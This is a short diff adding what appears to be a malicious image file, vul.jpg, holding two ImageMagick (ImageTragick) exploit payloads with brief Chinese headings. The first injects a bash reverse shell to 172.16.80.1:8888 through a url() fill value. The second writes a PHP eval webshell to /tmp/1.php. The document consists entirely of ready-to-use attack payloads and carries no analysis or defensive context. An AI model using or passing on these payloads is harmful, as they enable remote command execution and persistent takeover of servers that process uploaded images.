@@ -1,0 +1,16 @@
+
+vul.jpg
+
+一、反弹shell
+
+push graphic-context
+viewbox 0 0 640 480
+fill 'url(https://example.com/image.jpg"|bash -i >& /dev/tcp/172.16.80.1/8888 0>&1")'
+pop graphic-context
+
+二、写一句话
+
+push graphic-context
+viewbox 0 0 640 480
+fill 'url(https://example.com/image.jpg"|/bin/echo \<?php @eval\(\$_POST[a]\)\; ?\> >/tmp/1.php")'
+pop graphic-context
